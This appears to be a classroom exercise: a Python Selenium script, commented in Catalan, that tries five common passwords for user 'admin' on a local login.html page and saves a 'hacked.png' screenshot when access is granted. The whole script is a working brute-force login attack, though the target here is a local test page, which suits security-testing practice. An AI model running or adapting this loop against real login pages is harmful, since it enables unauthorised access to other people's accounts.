from selenium import webdriver
from selenium.webdriver.common.by import By
import time
import os
import sys

# Llista de contrasenyes (segons enunciat)
passwords = ['1234', 'qwerty', 'admin', 'password123', 'letmein']

# Obrim navegador (mode visible)
driver = webdriver.Firefox()

# Obrim el fitxer login.html local
file_path = "file://" + os.path.abspath("login.html")
driver.get(file_path)

time.sleep(1)

# Bucle d'atac
for pwd in passwords:
    # Localitzar camps
    username = driver.find_element(By.ID, "username")
    password = driver.find_element(By.ID, "password")
    login_btn = driver.find_element(By.ID, "loginBtn")

    # Esborrar camps
    username.clear()
    password.clear()

    # Injectar usuari i contrasenya
    username.send_keys("admin")
    password.send_keys(pwd)

    # Clicar login
    login_btn.click()

    time.sleep(1)

    # Assert de seguretat
    message = driver.find_element(By.ID, "message").text

    print(f"Provant password: {pwd} -> {message}")

    if message == "ACCESS_GRANTED":
        # Evidència: captura pantalla
        driver.save_screenshot("hacked.png")
        print("VULNERABILITAT TROBADA")
        driver.quit()
        sys.exit(0)

# Si no s'ha trobat cap password
print("No s'ha trobat cap contrasenya vàlida")
driver.quit()
